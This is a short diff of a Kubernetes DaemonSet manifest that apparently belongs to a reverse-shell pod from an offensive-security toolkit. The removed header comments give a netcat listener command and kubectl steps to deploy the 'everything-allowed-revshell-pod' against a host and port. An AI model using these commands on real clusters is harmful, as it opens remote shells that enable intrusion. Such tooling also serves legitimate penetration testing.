@@ -1,8 +1,3 @@
-###########################################################
-## Set up Listener: nc -nvlp [PORT]
-## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < everything-allowed-revshell-pod.yaml | kubectl apply -f - 
-## Remove: Remove: kubectl -n [namespace] delete everything-allowed-revshell-pod
-###########################################################
 apiVersion: apps/v1
 kind: DaemonSet
 metadata:
